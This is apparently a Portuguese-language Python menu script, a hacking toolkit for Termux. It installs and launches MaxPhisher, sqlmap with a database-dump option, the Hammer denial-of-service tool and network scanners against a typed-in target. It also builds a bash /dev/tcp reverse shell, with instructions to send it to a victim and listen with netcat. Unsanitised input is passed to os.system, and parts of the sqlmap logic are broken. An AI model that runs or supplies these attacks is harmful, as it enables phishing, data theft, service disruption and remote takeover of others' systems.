import os
os.system("clear")
os.system("figlet -f slant Cybersec")

print(f"\t\t\t\t\033[1;35m[v1.0]\033[0m")
print(f"\t\t\t\t\033[1;35m[By Jailsonnnn157]\033[0m")



#opções
print("__"*25)
print(' ')
print("\033[1;32m[1] - Maxphisher\033[0m")
print(" ")
print("\033[1;32m[2] - Dirb\033[0m")
print(" ")
print("\033[1;32m[3] - Nmap\033[0m")
print(" ")
print("\033[1;32m[4] - Sqlmap\033[0m")
print(" ")
print("\033[1;32m[5] - Netdiscover\033[0m")
print(" ")
print("\033[1;32m[6] - sql injection\033[0m")
print(" ")
print("\033[1;32m[7] - hammer\033[0m")
print(" ")
print("\033[1;32m[8] - reverse shell\033[0m")
print(" ")
print("\033[1;31m[00] - exit\033[0m")
print(" ")
num = input("→ ")
#tools

if num == "1":
    print("instalando maxphisher")
    os.system("pip3 install maxphisher")
    os.system("maxphisher")
    
elif num == "2":
    print('instalando dirb')
    os.system("pkg update")
    os.system("pkg upgrade -y")
    os.system("pkg install dirb")
    os.system("clear")
    os.system("figlet dirb")
    print('_________________ ')
    print(' ')
    
    url = input("digite sua url: ")
    os.system("dirb " + url)
    
    
    
elif num == "3":
   print('instalando nmap')
   os.system("pkg update")
   os.system("pkg upgrade -y")
   os.system("pkg install nmap")
   os.system('nmap -v')
   os.system('clear')
   os.system("figlet nmap")
   print(' ')
   print(" ")
   
elif num == "4":
    print("instalando sqlmap...")
    os.system("clear")
    os.system("pkg install python git -y")
    os.system("git clone https://github.com/sqlmapproject/sqlmap.git")
    os.system("python3 sqlmap/sqlmap.py -u ")
    os.system("clear")
    os.system("figlet Sqlmap")
    
    print("\033[1;33m--- MENU DE ATAQUES SQL ---")
    print("1 - Verificar se a URL é vulnerável")
    print("2 - Listar Bancos de Dados (--dbs)")
    print("3 - Listar Tabelas do Banco (--tables)")
    print("4 - Fazer o Dump de tudo (--dump")



   
    url = int(input("\nColoque a URL do alvo: "))
        
      
    if url == 1:
         print("\n[+] Testando vulnerabilidade...")
         os.system(f"python3 sqlmap/sqlmap.py u'{url}' --batch")
            
    elif url == 2:
            print("\n[+] Buscando Bancos de Dados...")
            os.system(f"python3 sqlmap/sqlmap.py -u '{url}' --batch --dbs")
            
    elif url == 3:
            print("\n[+] Listando tabelas...")
            os.system(f"python3 sqlmap/sqlmap.py -u '{url}' --batch --tables")
            
    elif url == 4:
            print("\n[+] Extraindo dados (Dump)...")
            os.system(f"python3 sqlmap/sqlmap.py -u '{url}' --batch --dump")

            input("\nAção finalizada. Pressione Enter para voltar ao menu...")
        
elif num == "4":
        input("\nPressione Enter para voltar...") 

elif num == "5":  
        os.system("clear")
        os.system("figlet Netdiscover")
        print("\033[1;33m--- MENU NETDISCOVER ---\033[0m")
        print("1 - Varredura Automática")
        print("2 - Varredura por Range (ex: 192.168.1.0/24)")
        print("3 - Varredura por Interface (ex: wlan0)")
        print("0 - Voltar\033[0m")
    
        opc = input("\nEscolha uma opção: ")
    
        if opc == "1":
            print("\n[+] Iniciando auto varredura...")
            os.system("netdiscover")
    
        elif opc == "2":
             range_ip = input("\nDigite o range de IP: ")
             os.system(f"netdiscover -r {range_ip}")
    
        elif opc == "3":
            interface = input("\nDigite a interface (ex: wlan0, eth0): ")
            os.system(f"netdiscover -i {interface}")
        
        input("\nAção finalizada. Pressione Enter para voltar ao menu...")
        
     
     
elif num == "6":
        os.system("clear")
        
        os.system("figlet SQL Injection")
        print("\033[1;31m--- TESTE DE VULNERABILIDADE SQL ---\033[0m")
        
        url = input("\nDigite a URL completa (ex: http://site.com/php?id=1): ")
        
        print("\n[+] Testando vulnerabilidade básica com aspas...")
        
        target = url + "'"
        
        print(f"[*] Alvo: {target}")
        print("[!] Verifique manualmente se o site retornou erros de 'Syntax Error' ou 'MySQL'.")
        
        os.system(f"curl -I {url}")
        
        print("\n[1] Tentar explorar com SQLMAP")
        print("[0] Voltar")
        
        escolha = input("\nDeseja ir para o SQLMAP? ")
        
        if escolha == "1":
            os.system(f"python3 sqlmap/sqlmap.py -u {url} --batch --dbs")
            
        input("\nPressione Enter para voltar ao menu...")
       
elif num == "7":
    os.system("clear")
    os.system("figlet Hammer")
    print("--- CONFIGURACAO HAMMER ---")
    
    if not os.path.exists("hammer"):
        print("\n[+] Clonando o repositorio...")
        os.system("git clone https://github.com/cyweb/hammer")
    
    alvo = input("\n[?] Digite o IP ou Dominio: ")
    porta = input("[?] Porta (padrao 80): ") or "80"
    threads = input("[?] Threads (padrao 135): ") or "135"
    
    print(f"\nIniciando ataque contra {alvo}...")
    
    try:
        # cd hammer && python3 hammer.py
        os.system(f"cd hammer && python3 hammer.py -s {alvo} -p {porta} -t {threads}")
    except Exception as e:
        print(f"Erro ao executar: {e}")
    
    input("\nPressione Enter para voltar...")



if num == "8":
    print('instalando shell reverse')
    os.system("pkg update && pkg upgrade -y")
    os.system("pkg install netcat-openbsd nmap          python -y")
    os.system('clear')
    os.system("figlet reverse shell")
    print("\n\033[1;33m--- GERADOR DE REVERSE          SHELL ---\033[0m")
    
    
    ip = input("\n\033[1;32m[?]\033[0m Digite seu IP (LHOST): ")
    porta = input("\033[1;32m[?]\033[0m Digite a Porta (LPORT): ")

    
    payload = f"bash -i >& /dev/tcp/{ip}/{porta} 0>&1"

    os.system("clear")
    print("\033[1;31m[!] COMANDO GERADO COM SUCESSO:\033[0m\n")
    print("-" * 50)
    print(f"\033[1;37m{payload}\033[0m") 
    print("-" * 50)
    
    print(f"\n\033[1;33m[PROXIMOS PASSOS]:\033[0m")
    print(f"1. Copie o comando acima e mande para o alvo.")
    print(f"2. No seu terminal, antes do alvo rodar, use: \033[1;32mnc -lvnp {porta}\033[0m")
    
    input("\nPressione Enter para voltar ao menu...")
